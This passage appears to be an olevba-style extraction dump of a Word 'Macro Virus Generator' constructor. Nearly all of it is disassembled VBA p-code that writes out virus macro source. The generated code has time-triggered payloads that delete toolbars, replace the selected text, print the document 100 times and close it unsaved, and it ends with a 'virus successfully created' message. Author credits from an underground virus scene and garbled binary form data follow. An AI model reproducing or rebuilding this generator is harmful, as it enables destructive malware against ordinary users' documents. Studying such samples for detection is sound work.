' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #506:
' 	ElseBlock 
' Line #507:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #508:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #509:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #510:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #511:
' 	EndIfBlock 
' Line #512:
' 	EndIfBlock 
' Line #513:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #514:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #515:
' 	ElseBlock 
' Line #516:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #517:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #518:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #519:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #520:
' 	ElseBlock 
' Line #521:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #522:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #523:
' 	EndIfBlock 
' Line #524:
' 	EndIfBlock 
' Line #525:
' 	EndIfBlock 
' Line #526:
' 	EndIfBlock 
' Line #527:
' 	EndIfBlock 
' Line #528:
' 	LitDI2 0x005F 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #529:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #530:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Second(Now()) = "
' 	Ld start_opcija 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x0010 "Minute(Now()) = "
' 	Concat 
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " And "
' 	Concat 
' 	LitStr 0x000D "Day(Now()) = "
' 	Concat 
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " then"
' 	Concat 
' 	PrintItemNL 
' Line #531:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #532:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #533:
' 	ElseBlock 
' Line #534:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #535:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #536:
' 	ElseBlock 
' Line #537:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #538:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #539:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #540:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #541:
' 	EndIfBlock 
' Line #542:
' 	EndIfBlock 
' Line #543:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #544:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #545:
' 	ElseBlock 
' Line #546:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #547:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #548:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #549:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #550:
' 	ElseBlock 
' Line #551:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #552:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #553:
' 	EndIfBlock 
' Line #554:
' 	EndIfBlock 
' Line #555:
' 	EndIfBlock 
' Line #556:
' 	EndIfBlock 
' Line #557:
' 	EndIfBlock 
' Line #558:
' 	LitDI2 0x0061 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #559:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #560:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "If Hour(Now)) = "
' 	Ld d 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	PrintItemNL 
' Line #561:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #562:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #563:
' 	ElseBlock 
' Line #564:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #565:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #566:
' 	ElseBlock 
' Line #567:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #568:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #569:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #570:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #571:
' 	EndIfBlock 
' Line #572:
' 	EndIfBlock 
' Line #573:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #574:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #575:
' 	ElseBlock 
' Line #576:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #577:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #578:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #579:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #580:
' 	ElseBlock 
' Line #581:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #582:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #583:
' 	EndIfBlock 
' Line #584:
' 	EndIfBlock 
' Line #585:
' 	EndIfBlock 
' Line #586:
' 	EndIfBlock 
' Line #587:
' 	EndIfBlock 
' Line #588:
' 	LitDI2 0x0062 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #589:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	IfBlock 
' Line #590:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "If Day(Now()) = "
' 	Ld e 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	PrintItemNL 
' Line #591:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #592:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #593:
' 	ElseBlock 
' Line #594:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #595:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #596:
' 	ElseBlock 
' Line #597:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #598:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #599:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #600:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #601:
' 	EndIfBlock 
' Line #602:
' 	EndIfBlock 
' Line #603:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #604:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #605:
' 	ElseBlock 
' Line #606:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #607:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #608:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #609:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #610:
' 	ElseBlock 
' Line #611:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #612:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #613:
' 	EndIfBlock 
' Line #614:
' 	EndIfBlock 
' Line #615:
' 	EndIfBlock 
' Line #616:
' 	EndIfBlock 
' Line #617:
' 	EndIfBlock 
' Line #618:
' 	LitDI2 0x0063 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #619:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	And 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	IfBlock 
' Line #620:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0013 "If Minute(Now()) = "
' 	Ld B 
' 	Concat 
' 	LitStr 0x0005 " Then"
' 	Concat 
' 	PrintItemNL 
' Line #621:
' 	Ld Sections 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #622:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001B "CommandBars("Tools").Delete"
' 	PrintItemNL 
' Line #623:
' 	ElseBlock 
' Line #624:
' 	Ld l 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #625:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001C "CommandBars("Insert").Delete"
' 	PrintItemNL 
' Line #626:
' 	ElseBlock 
' Line #627:
' 	Ld textbox7 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #628:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0023 "For ERTIGA = 1 To CommandBars.Count"
' 	PrintItemNL 
' Line #629:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x001A "CommandBars(ERTIGA).Delete"
' 	PrintItemNL 
' Line #630:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "Next ERTIGA"
' 	PrintItemNL 
' Line #631:
' 	EndIfBlock 
' Line #632:
' 	EndIfBlock 
' Line #633:
' 	Ld odmahclose 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #634:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0011 "Selection.Text = "
' 	Ld selec 
' 	MemLd Text 
' 	Concat 
' 	LitStr 0x0000 ""
' 	Concat 
' 	PrintItemNL 
' Line #635:
' 	ElseBlock 
' Line #636:
' 	Ld closeme_now 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #637:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0010 "For X = 1 To 100"
' 	PrintItemNL 
' Line #638:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0017 "ActiveDocument.PrintOut"
' 	PrintItemNL 
' Line #639:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "Next X"
' 	PrintItemNL 
' Line #640:
' 	ElseBlock 
' Line #641:
' 	Ld p 
' 	MemLd _B_var_Text 
' 	LitVarSpecial (True)
' 	Eq 
' 	IfBlock 
' Line #642:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0027 "ActiveDocument.Close SaveChanges:=False"
' 	PrintItemNL 
' Line #643:
' 	EndIfBlock 
' Line #644:
' 	EndIfBlock 
' Line #645:
' 	EndIfBlock 
' Line #646:
' 	EndIfBlock 
' Line #647:
' 	EndIfBlock 
' Line #648:
' 	LitR8 0x0000 0x0000 0xE000 0x4058 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #649:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000B "'WordMacro."
' 	Ld _B_var_vir_ime 
' 	Concat 
' 	LitStr 0x0004 " by "
' 	Concat 
' 	Ld _B_var_aut_ime 
' 	Concat 
' 	PrintItemNL 
' Line #650:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x002A "'RCJ v1.0 (Random Comment Junker) by e[ax]"
' 	PrintItemNL 
' Line #651:
' 	Ld min 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Ld dani 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	Ld sati 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	Ld mjesec 
' 	MemLd Text 
' 	LitStr 0x0000 ""
' 	Ne 
' 	Or 
' 	IfBlock 
' Line #652:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "End If"
' 	PrintItemNL 
' Line #653:
' 	EndIfBlock 
' Line #654:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "End Sub"
' 	PrintItemNL 
' Line #655:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #656:
' 	LitDI2 0x0064 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #657:
' 	LitStr 0x0010 "Progres zavrsen!"
' 	Ld _B_var_False 
' 	MemSt Caption 
' Line #658:
' 	LitStr 0x0009 "Virus WM."
' 	Ld _B_var_vir_ime 
' 	Concat 
' 	LitStr 0x0014 " uspjesno kreiran!!!"
' 	Concat 
' 	Ld vbOKOnly 
' 	LitStr 0x0010 "MVG v1.0 - Info!"
' 	ArgsCall MsgBox 0x0003 
' Line #659:
' 	LitStr 0x0008 "MVG v1.0"
' 	Ld _B_var_False 
' 	MemSt Caption 
' Line #660:
' 	LitDI2 0x0000 
' 	Ld Appearance 
' 	MemSt _B_var_Text 
' Line #661:
' 	EndSub 
' Line #662:
' 	FuncDefn (Private Sub UserForm_Click())
' Line #663:
' 	Ld _B_var_W97M_serpent 
' 	ArgsMemCall Show 0x0000 
' Line #664:
' 	EndSub 
' Line #665:
' 	FuncDefn (Sub form())
' Line #666:
' 	Ld glavna 
' 	ArgsMemCall Show 0x0000 
' Line #667:
' 	EndSub 
' Macros/VBA/autorforma - 2040 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton3_Click())
' Line #1:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' Macros/VBA/gretforma - 2055 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #2:
' 	EndSub 
' Line #3:
' Macros/VBA/infomvg - 3008 bytes
' Line #0:
' 	FuncDefn (Private Sub Image1_Click())
' Line #1:
' 	LitStr 0x0082 "...u ovoj divljini od informatike jedini virusi koji mogu opstati su macro virusi, dobro programirani Win32 i multipartite virusi!"
' 	Ld mvginfo_Click 
' 	LitStr 0x0010 "MVG v1.0 - Tips!"
' 	ArgsCall MsgBox 0x0003 
' Line #2:
' 	EndSub 
' Line #3:
' Line #4:
' 	FuncDefn (Private Sub Label2_Click())
' Line #5:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #6:
' 	EndSub 
' Macros/VBA/kontakti - 3181 bytes
' Line #0:
' 	FuncDefn (Private Sub Shell())
' Line #1:
' 	LitStr 0x002F "C:\Program Files\Internet Explorer\IEXPLORE.EXE"
' 	ArgsLd Dir 0x0001 
' 	LitStr 0x000C "IEXPLORE.EXE"
' 	Ne 
' 	IfBlock 
' Line #2:
' 	LitStr 0x0022 "Internet Explorer nije instaliran!"
' 	Ld vbCritical 
' 	LitStr 0x0010 "MVG v1.0 - error"
' 	ArgsCall MsgBox 0x0003 
' Line #3:
' 	ElseBlock 
' Line #4:
' 	LitStr 0x003E "C:\Program Files\Internet Explorer\IEXPLORE.EXE virlab.cjb.net"
' 	Ld kont_Click 
' 	ArgsCall vbNormalFocus 0x0002 
' Line #5:
' 	EndIfBlock 
' Line #6:
' 	EndSub 
' Line #7:
' Line #8:
' 	FuncDefn (Private Sub kontakti())
' Line #9:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #10:
' 	EndSub 
' Macros/VBA/userexit - 2608 bytes
' Line #0:
' 	FuncDefn (Private Sub CommandButton1_Click())
' Line #1:
' 	Ld c 
' 	Ld Application 
' 	MemSt WindowState 
' Line #2:
' 	End 
' Line #3:
' 	EndSub 
' Line #4:
' 	FuncDefn (Private Sub kontakti())
' Line #5:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #6:
' 	EndSub 
' Macros/VBA/w97m_serpent - 1787 bytes
' Line #0:
' 	FuncDefn (Private Sub Label2_Click())
' Line #1:
' 	Ld id_FFFF 
' 	ArgsCall Unload 0x0001 
' Line #2:
' 	EndSub 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�VCK:          Macro Virus Generator                           Verzija:    1.0                                                      Autor:      e[ax]                                                                                S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Pisem za "KRe7", prvi BiH Undergound e-zine. Inace se bavim virusima vec 2 godine. Za sada grupacija ima samo dva clana i to rudeboy-a i mene. Ako je jos neko zainteresovan moze me kontaktirati na email: vl@anonymous.to.                           Greetz!  S
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CommandButton1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�CommandButton1�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�:: O U T ::
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/autorforma/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Tahoma@
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
K�Qlt
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
GIF89a�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����))�!!�!!�)!�)!�!
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�9)�9)�1!�1!�1!�1!�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B)�B)�9!�9!�9!�)
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�B!�B!�1
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R)�J!�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�J!�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z)�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�R!�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�Z!�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�k)�9
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c!�J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�c!�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s)�k!�B
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�s)�{)�s!�{)�k
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ބ)�s!�Z
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�{!�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ތ)�s!�{!{J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֌)΄!�c
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
֔)Ό!�{
-------------------------------------------------------------------------------
VBA FORM STRING IN 'Constructor.MSWord.MVG' - OLE stream: 'Macros/glavna/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ޜ)ƌ!�s
-------------------------------------------------------------------------------
